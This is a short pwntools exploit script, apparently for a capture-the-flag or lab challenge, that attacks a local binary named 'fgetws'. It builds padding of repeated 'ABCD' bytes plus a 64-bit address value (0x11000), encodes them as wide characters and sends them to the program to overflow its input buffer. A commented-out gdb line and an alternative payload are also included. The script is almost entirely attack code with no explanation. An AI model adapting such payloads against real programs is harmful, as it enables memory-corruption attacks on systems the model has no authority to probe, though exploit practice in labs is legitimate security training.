from pwn import *

io = process('./fgetws')
#io = gdb.debug('./fgetws', 'break main')

byte_data = b'ABCD'*10
unicode_string0 = byte_data.decode('utf-16-le')
byte_data = p64(0x11000)
unicode_string = unicode_string0 + byte_data.decode('utf-32-le')

#byte_data = p64(0x11021)*10
#unicode_string = byte_data.decode('utf-32-le')

io.sendline(unicode_string)
print(io.recvall())
